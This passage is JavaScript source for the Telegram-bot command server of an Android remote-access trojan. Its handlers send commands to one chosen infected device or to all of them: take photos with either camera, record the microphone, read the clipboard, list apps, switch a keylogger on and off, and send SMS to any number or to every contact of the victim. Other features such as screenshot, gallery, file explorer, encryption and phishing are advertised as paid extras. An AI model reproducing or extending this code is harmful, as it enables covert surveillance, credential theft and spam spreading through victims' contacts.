      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Apps action
    if (msg.text === "✯ 𝙰𝚙𝚙𝚜 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "apps", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "apps", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Main Camera action
    if (msg.text === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "main-camera", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "main-camera", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Selfie Camera action
    if (msg.text === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "selfie-camera", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Microphone action
    if (msg.text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") {
      appData.set("currentAction", "microphoneDuration");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
    // Handle Clipboard action
    if (msg.text === "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "clipboard", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "clipboard", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Screenshot action
    if (msg.text === "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Toast action
    if (msg.text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") {
      appData.set("currentAction", "toastText");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
    // Handle Send SMS action
    if (msg.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") {
      appData.set("currentAction", "smsNumber");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
    // Handle Vibrate action
    if (msg.text === "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯") {
      appData.set("currentAction", "vibrateDuration");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
    // Handle Play Audio action
    if (msg.text === "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Stop Audio action
    if (msg.text === "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Keylogger ON action
    if (msg.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "keylogger-on", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Keylogger OFF action
    if (msg.text === "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯") {
      if (target == "all") {
        io.sockets.emit("commend", { request: "keylogger-off", extras: [] });
      } else {
        io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle File Explorer action
    if (msg.text === "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Gallery action
    if (msg.text === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Encrypt action
    if (msg.text === "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Decrypt action
    if (msg.text === "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Open URL action
    if (msg.text === "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Phishing action
    if (msg.text === "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯") {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true
        }
      });
    }
    
    // Handle Send SMS to all contacts action
    if (msg.text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
      appData.set("currentAction", "textToAllContacts");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
    // Handle Pop Notification action
    if (msg.text === "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯") {
      appData.set("currentAction", "notificationText");
      bot.sendMessage(data.id, "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
    
  } else {
    // Handle device selection
    io.sockets.sockets.forEach((socket, id, set) => {
      if (msg.text === socket.model) {
        appData.set("currentTarget", id);
        bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + socket.model + "</b>\n\n", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
              ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
              ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
              ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
              ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
              ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
              ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
              ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
              ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
              ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
              ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"],
              ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
              ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    });
    
    if (msg.text == "✯ 𝙰𝚕𝚕 ✯") {
      appData.set("currentTarget", "all");
      bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"],
            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((socket, id, set) => {
    io.to(id).emit("ping", {});
  });
}, 5000);

setInterval(() => {
  https.get(data.env, res => {}).on("error", err => {});
}, 480000);

server.listen(process.env.PORT || 2332, () => {
  console.log("listening on port 2332");
});